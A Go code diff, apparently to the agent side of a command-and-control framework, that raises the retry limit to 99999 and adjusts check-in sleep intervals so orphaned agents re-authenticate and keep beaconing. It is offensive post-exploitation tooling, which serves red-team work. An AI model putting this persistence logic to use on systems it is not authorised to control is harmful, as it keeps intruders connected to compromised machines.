@@ -134,7 +134,7 @@ func New(protocol string, url string, host string, psk string, proxy string, ja3
 		WaitTimeMax:        30,
 		ActiveMax:          30, //This should match WaitTimeMax
 		PaddingMax:         4096,
-		MaxRetry:           9999,
+		MaxRetry:           99999,
 		InactiveMultiplier: 5,
 		InactiveThreshold:  6,
 		Verbose:            verbose,
@@ -444,8 +444,14 @@ func (a *Agent) statusCheckIn() {
 		a.InactiveCount++
 		if a.InactiveCount == a.InactiveThreshold {
 			a.InactiveCount = 0
-			a.WaitTimeMin *= a.InactiveMultiplier
-			a.WaitTimeMax *= a.InactiveMultiplier
+			//Should only happen if orphaned agents checks in and isn't interacted with
+			if a.WaitTimeMin < a.ActiveMin {
+				a.WaitTimeMin = a.ActiveMin
+				a.WaitTimeMax = a.ActiveMax
+			} else {
+				a.WaitTimeMin *= a.InactiveMultiplier
+				a.WaitTimeMax *= a.InactiveMultiplier
+			}
 			a.sendMessage("POST", a.getAgentInfoMessage())
 		}
 		return
@@ -651,6 +657,9 @@ func (a *Agent) sendMessage(method string, m messages.Base) (messages.Base, erro
 			if a.Verbose {
 				message("note", "server returned a 401, reauthenticating orphaned agent")
 			}
+			a.WaitTimeMin = 15
+			a.WaitTimeMax = 30
+			a.InactiveCount = 0
 			msg := messages.Base{
 				Version: 1.0,
 				ID:      a.ID,
